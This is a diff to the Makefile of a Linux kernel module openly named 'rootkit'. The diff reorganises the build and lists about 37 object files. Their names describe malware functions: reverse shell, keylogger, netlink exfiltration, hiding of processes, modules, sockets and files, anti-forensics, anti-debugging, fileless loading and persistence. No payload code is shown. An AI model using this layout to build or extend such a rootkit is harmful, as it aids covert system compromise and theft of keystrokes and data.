@@ -1,48 +1,58 @@
-ccflags-y += -I$(PWD)/src
+obj-m := rootkit.o
 
-obj-m += rootkit.o
 
-rootkit-objs := \
-	src/ftrace_hook.o \
-	src/string_encrypt.o \
-	src/anti_debug.o \
-	src/watchdog.o \
-	src/netfilter_trigger.o \
-	src/hmac_auth.o \
-	src/persistence.o \
-	src/inline_hook.o \
-	src/directory_encrypt.o \
-	src/process_hiding.o \
-	src/module_hiding.o \
-	src/socket_hiding.o \
-	src/syscall_hook.o \
-	src/reverse_shell.o \
-	src/keylogger.o \
-	src/anti_forensics.o \
-	src/packet_filter.o \
-	src/anti_watchdog.o \
-	src/vfs_file_hiding.o \
-	src/command_executor.o \
-	src/delayed_activation.o \
-	src/fileless_loader.o \
-	src/self_watchdog.o \
-	src/unload_protection.o \
-	src/anti_memdump.o \
-	src/sysctl_hiding.o \
-	src/breakpoint_detector.o \
-	src/netlink_exfil.o \
-	src/anti_kprobe.o \
-	src/recovery_trigger.o \
-	src/trace_disabler.o \
-	src/heap_encrypt.o \
-	src/key_injector.o \
-	src/rootkit_core.o
+ROOTKIT_DIR := $(PWD)
+SRC_DIR := $(ROOTKIT_DIR)/src
+INC_DIR := $(ROOTKIT_DIR)/include
 
-KDIR := /lib/modules/$(shell uname -r)/build
-PWD := $(shell pwd)
+EXTRA_CFLAGS += -I$(INC_DIR)
+
+
+ROOTKIT_OBJS := \
+    ftrace_hook.o \
+    string_encrypt.o \
+    hmac_auth.o \
+    persistence.o \
+    directory_encrypt.o \
+    anti_debug.o \
+    watchdog.o \
+    inline_hook.o \
+    netfilter_trigger.o \
+    process_hiding.o \
+    module_hiding.o \
+    socket_hiding.o \
+    syscall_hook.o \
+    reverse_shell.o \
+    keylogger.o \
+    anti_forensics.o \
+    packet_filter.o \
+    anti_watchdog.o \
+    vfs_file_hiding.o \
+    command_executor.o \
+    delayed_activation.o \
+    fileless_loader.o \
+    self_watchdog.o \
+    unload_protection.o \
+    anti_memdump.o \
+    sysctl_hiding.o \
+    breakpoint_detector.o \
+    netlink_exfil.o \
+    anti_kprobe.o \
+    recovery_trigger.o \
+    trace_disabler.o \
+    heap_encrypt.o \
+    key_injector.o \
+    rootkit_core.o \
+    memory_utils.o \
+    write_protection.o \
+    ftrace_regs.o
+
+rootkit-objs := $(addprefix src/, $(ROOTKIT_OBJS))
+
 
 all:
-	$(MAKE) -C $(KDIR) M=$(PWD) modules
+	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(ROOTKIT_DIR) modules
+
 
 clean:
-	$(MAKE) -C $(KDIR) M=$(PWD) clean
+	$(MAKE) -C /lib/modules/$(shell uname -r)/build M=$(ROOTKIT_DIR) clean
